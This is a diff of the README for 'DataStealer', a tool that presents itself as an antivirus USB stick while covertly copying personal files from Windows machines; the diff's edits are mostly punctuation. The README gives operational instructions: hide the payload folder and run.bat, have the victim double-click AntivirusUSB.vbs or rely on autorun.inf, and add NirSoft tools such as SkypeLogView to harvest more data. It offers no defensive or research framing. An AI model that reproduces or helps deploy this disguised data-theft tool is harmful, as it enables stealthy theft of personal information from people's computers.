@@ -1,12 +1,12 @@
 # DataStealer
 
 ## Information
-DataStealer pretends be a Antivirus USB to gather personal information in Windows systems.
+DataStealer is a simple funcionality for USB device (fake Antivirus USB) to gather information in Windows systems.
 
 ## Intructions
 Just copy all from DataStealer folder and paste in USB device. Hide **"data"** folder and **"run.bat"**. When you conect USB device in Windows system just doble click in AntivirusUSB.vbs and DataStealer copy all files stealthily from pc.
 
-***NOTE: You can use autotun.inf for auto-execute .vbs file but it only works in Windows Vista and Windows XP***
+***NOTE: You can use autotun.inf for auto-execute .vbs file but it only works in Windows Vista and Windows XP.***
 
 [**Autorun.inf**](wikipedia.org/wiki/AutoRun "Wikipedia")
 >[AutoRun]
@@ -16,7 +16,7 @@ Just copy all from DataStealer folder and paste in USB device. Hide **"data"** f
 ## Configuration
 
 ### Folders
-If you want you can add more lines with folders in **"run.bat"** for gather information
+If you want you can add more lines with folders in **"run.bat"** for gather information.
 
 Like this:
 >REM ############ Formats ############
@@ -40,9 +40,9 @@ Like this:
 ### More funcionalities (Nirsoft)
 NirSoft web site provides a unique collection of small and useful freeware utilities, all of them developed by Nir Sofer. 
 
-For more funcionalities, go to [nirsoft.net](www.nirsoft.net "Nirsoft"), download software and put in "data/soft/" folder
+For more funcionalities, go to [nirsoft.net](www.nirsoft.net "Nirsoft"), download software and put in "data/soft/" folder.
 
-Later add a line for each software in **"run.bat"**
+Later add a line for each software in **"run.bat"**.
 
 Like this:
 >REM ############ Nirsoft ############
@@ -51,7 +51,7 @@ Like this:
 >
 >REM #################################
 
-Replace **SkypeLogView** in both places with the software name
+Replace **SkypeLogView** in both places with the software name.
 
 # Download
 [Releases](https://github.com/Kevinsillo/datastealer/releases)
